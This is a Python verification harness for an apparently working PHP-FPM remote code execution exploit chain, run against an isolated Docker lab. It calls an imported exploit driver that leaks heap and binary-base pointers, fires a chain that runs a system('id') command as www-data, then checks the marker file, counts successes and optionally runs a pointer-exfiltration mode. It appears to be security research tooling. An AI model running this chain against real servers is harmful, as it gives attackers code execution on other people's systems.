#!/usr/bin/env python3
"""Verifier for fpm_echo_route_driver.py, end to end on an 8.4.26-fpm echo-sink
lab. Runs echo_route N times to prove the chain lands uid=33 as one module
(chunk leak + auto-derived remote binbase -> shimmed stock run_fpm_chain fire),
worker-surviving, with no /proc in the exploit path. The fire SIGSEGVs after
system() runs, so success is the out-of-band marker that system('id') wrote plus
the pool still serving; the remote binbase is cross-checked against /proc only
after the fact. --compare also runs the exfil-only comparison-sink mode once.
Needs docker access to the lab container. Lab/analysis use only.

Lab bring-up (isolated echo+comparison-sink lab, port 8170 -> nginx -> fpm:9000):
    docker compose -f docker-compose.fpm-avenues.yml -p p2s-erd --profile erd up -d --build
    python3 -I poc/chains/verify_fpm_echo_route_driver.py \
        --container p2s-erd-fpm --host 127.0.0.1 --port 8170 --runs 5 [--compare]
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import subprocess
import sys
import time

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/


def _load(name, filename):
    path = os.path.join(_HERE, filename)
    if not os.path.exists(path):
        path = os.path.join(_POC_ROOT, filename)
    spec = importlib.util.spec_from_file_location(name, path)
    m = importlib.util.module_from_spec(spec)
    for _p in (_HERE, _POC_ROOT):
        if _p not in sys.path:
            sys.path.insert(0, _p)
    spec.loader.exec_module(m)
    return m


if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.labharness import _dx, proc_binbase, worker_alive  # noqa: E402


def main(argv=None):
    ap = argparse.ArgumentParser()
    ap.add_argument("--container", default="p2s-erd-fpm")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8170)
    ap.add_argument("--path", default="/remote_app.php")
    ap.add_argument("--marker", default="/dev/shm/p",
                    help="OOB marker path; 'id>'+marker must be <=14 bytes")
    ap.add_argument("--runs", type=int, default=5)
    ap.add_argument("--variant", choices=["8.4", "8.5"], default="8.4")
    ap.add_argument("--tries", type=int, default=12)
    ap.add_argument("--attempts", type=int, default=6)
    ap.add_argument("--compare", action="store_true",
                    help="also run the exfil-only comparison-sink mode once "
                         "(order.php + gate.php), documenting WALL 1")
    args = ap.parse_args(argv)

    drv = _load("fpm_echo_route_driver", "fpm_echo_route_driver.py")
    print(f"[verify] erd echo-route driver, variant={args.variant} "
          f"(a7 R: leak + auto-derived binbase + run_fpm_chain"
          f"{' + 8.4.26 shim' if args.variant == '8.4' else ' native'})")
    pbb = proc_binbase(args.container)
    print(f"[verify] /proc binbase (cross-check only, NEVER fed in): "
          f"{hex(pbb) if pbb else 'n/a'}")
    marker_cmd = f"id>{args.marker}"

    wins = uid_ok = leak_match = req_total = 0
    for run in range(1, args.runs + 1):
        print("\n" + "#" * 64 + f"\n[verify] RUN {run}/{args.runs}\n" + "#" * 64)
        _dx(args.container, "sh", "-c", f"rm -f {args.marker}")
        t0 = time.time()
        r = drv.echo_route(args.host, args.port, args.path, marker_cmd,
                           variant=args.variant, tries=args.tries,
                           attempts=args.attempts, verbose=True)
        dt = time.time() - t0
        bb = r.get("binbase")
        if bb is not None and pbb is not None and bb == pbb:
            leak_match += 1
        reqs = (r.get("leak_reqs") or 0) + (r.get("rce_reqs") or 0)
        req_total += reqs
        time.sleep(0.4)
        _, out = _dx(args.container, "sh", "-c",
                     f"cat {args.marker} 2>/dev/null")
        out = out.strip()
        got_uid = "uid=" in out
        is_wwwdata = ("www-data" in out) or ("uid=33" in out)
        alive = worker_alive(args.container)
        if r.get("ok"):
            wins += 1
        if got_uid and alive:
            uid_ok += 1
        bbs = f"0x{bb:x}" if bb else "None"
        print(f"[verify] RUN {run}: fire_http={r.get('ok')} binbase={bbs} "
              f"binbase==/proc={bb == pbb} reqs={reqs} elapsed={dt:.1f}s "
              f"err={r.get('error')}")
        print(f"[verify] RUN {run}: marker={out!r} -> uid={got_uid} "
              f"www-data={is_wwwdata} worker_alive={alive}")

    print("\n" + "=" * 64)
    print(f"[verify] SUMMARY over {args.runs} echo-route runs (variant {args.variant}):")
    print(f"  marker uid + worker  : {uid_ok}/{args.runs}  "
          f"(the real end-to-end success signal)")
    print(f"  fire HTTP ok         : {wins}/{args.runs}  "
          f"(unreliable: the fire SIGSEGVs after system(); marker is truth)")
    print(f"  binbase==/proc       : {leak_match}/{args.runs}  "
          f"(remote leak correctness; /proc NEVER fed in)")
    print(f"  avg requests/run     : {req_total / args.runs:.1f}")
    print(f"  composition          : fpm_binbase_rleak.leak_binbase (auto) + "
          f"fpm_route.run_fpm_chain + fire_8426_shim.install")

    cmp_ok = True
    if args.compare:
        print("\n" + "#" * 64 + "\n[verify] COMPARE mode (EXFIL-ONLY; WALL 1)\n"
              + "#" * 64)
        base = f"http://{args.host}:{args.port}/order.php"
        chunk, binbase, detail = drv.compare_route(base, fire=False, verbose=True)
        cmp_match = (binbase is not None and pbb is not None and binbase == pbb)
        print(f"[verify] COMPARE: chunk={hex(chunk) if chunk else None} "
              f"binbase={hex(binbase) if binbase else None} "
              f"binbase==/proc={cmp_match} reqs={detail.get('reqs')} "
              f"chunk_agree={detail.get('chunk_agree')}")
        print("[verify] COMPARE: exfil of BOTH pointers with NO echo. WALL 1: a "
              "pure comparison sink cannot carry the a7 fire's by-name resolution "
              "reads (R-3..R-6), so compare mode is exfil-only (no fire here).")
        cmp_ok = cmp_match

    ok = (uid_ok == args.runs) and cmp_ok
    print("\n[verify] RESULT:", "PASS" if ok else "FAIL")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
